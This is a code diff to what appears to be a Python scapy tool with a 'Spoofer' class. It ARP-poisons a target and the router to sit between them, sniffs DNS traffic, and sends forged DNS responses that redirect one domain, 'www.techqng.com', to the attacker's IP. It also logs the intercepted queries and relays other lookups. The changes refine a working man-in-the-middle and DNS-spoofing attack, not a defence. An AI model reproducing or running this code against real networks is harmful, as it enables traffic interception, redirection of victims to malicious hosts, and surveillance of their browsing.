@@ -1,20 +1,21 @@
-from scapy.all import DNS, IP,sr1# type:ignore
+from scapy.all import DNS, IP,sr1,send,sniff,srp, Packet# type:ignore
+from scapy.all import conf
 from scapy.layers.l2 import ARP,Ether
 from scapy.layers.inet import UDP,IP #type :ignore
 from scapy.layers.dns import DNS,DNSQR,DNSRR
 
 from data.data_helper import record_entry
-import scapy.config
-scapy.config.conf.noenum.add(scapy.config.conf.route.resync)
-scapy.config.conf.use_pcap = True
-scapy.config.conf.use_dnet = False #type:ignore
-#disable DNS resolution
-scapy.config.conf.netcache.resolve = False #type:ignore
-import scapy.all as scapy
 
-
+from random import randint
 import json
 import time
+
+
+conf.noenum.add(conf.route.resync)
+conf.use_pcap = True
+conf.use_dnet = False #type:ignore
+#disable DNS resolution
+conf.netcache.resolve = False #type:ignore
 
 
 class Spoofer:
@@ -38,7 +39,7 @@ class Spoofer:
         # This packet is saying - I am the router.
 
         # sending the packet
-        scapy.send(packet, verbose=False)
+        send(packet, verbose=False)
 
 
 
@@ -54,7 +55,7 @@ class Spoofer:
         # creating the packet
         packet = ARP(op=2, pdst=dest, hwdst=target_mac, psrc=source, hwsrc=source_mac)
         # sending the packet
-        scapy.send(packet, verbose=False)
+        send(packet, verbose=False)
 
     def get_mac(self,ip: str):
         """Get mac of the ip using ARP.
@@ -69,7 +70,7 @@ class Spoofer:
         # broadcast packet creation
         final_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
         # getting the response
-        answer = scapy.srp(final_packet, timeout=2, verbose=False)[0]
+        answer = srp(final_packet, timeout=2, verbose=False)[0]
         # getting the MAC (its src because its a response)
         mac = answer[0][1].hwsrc
         return mac
@@ -91,10 +92,9 @@ class Spoofer:
             #print("Found dns packets")
             domain = packet[DNSQR].qname.decode().rstrip(".")
             if 'info' in domain:
-
                 pass
-            if domain == "www.techqng.info.com":
-                #print(f"Intercepted DNS query for {domain}")
+            if domain == "www.techqng.com":
+                print(f"Intercepted DNS query for {domain}")
 
                 # Craft spoofed DNS response
                 response_packet = (
@@ -111,14 +111,14 @@ class Spoofer:
                 )
 
                 # Send spoofed response
-                scapy.send(response_packet, verbose=0)
+                send(response_packet, verbose=0)
                 record_entry(domain,self.build_dict_from_packet(packet))
                 print(f"Spoofed DNS response sent: {domain} -> {self.__ip}")
             else:
                 response_packet = self.nslookup(domain)
                 response_packet[IP].src,response_packet[IP].dst = packet[IP].dst,packet[IP].src
                 # Modify the response packet, so it will match target's original query.
-                scapy.send(response_packet,verbose=0) #type:ignore
+                send(response_packet,verbose=0) #type:ignore
 
     def forward_to_router(self):
         """
@@ -127,7 +127,7 @@ class Spoofer:
         Using scapy to sniff all of the packets from target to router, and calling process_packet to handle them.
         """
         while True:
-            scapy.sniff(iface="en1",prn=self.process_packet,promisc=True,store=0,timeout=4)
+            sniff(filter="udp port 53",prn=self.process_packet,promisc=True,store=0,timeout=4)
             self.urls = self.get_urls()
         # Capture all packets sent from the target, and not meant for host. because of the ARP spoofing, this packets are meant to be sent to the router.
         # Dump all corresponding packets into process_packet to handle.
@@ -155,8 +155,8 @@ class Spoofer:
         return urls
 
 
-    def nslookup(self,domain) -> scapy.Packet:
-        dns_query = IP(dst="8.8.8.8") / UDP(dport=53) / DNS(qdcount=1, rd=1,qd = 0)/DNSQR(qname=domain)
+    def nslookup(self,domain) -> Packet:
+        dns_query = IP(dst="8.8.8.8") / UDP(dport=53,sport=randint(20000,40000)) / DNS(qdcount=1, rd=1,qd = 0)/DNSQR(qname=domain)
         response_packet = sr1(dns_query,verbose=0)
         return response_packet #type:ignore
 
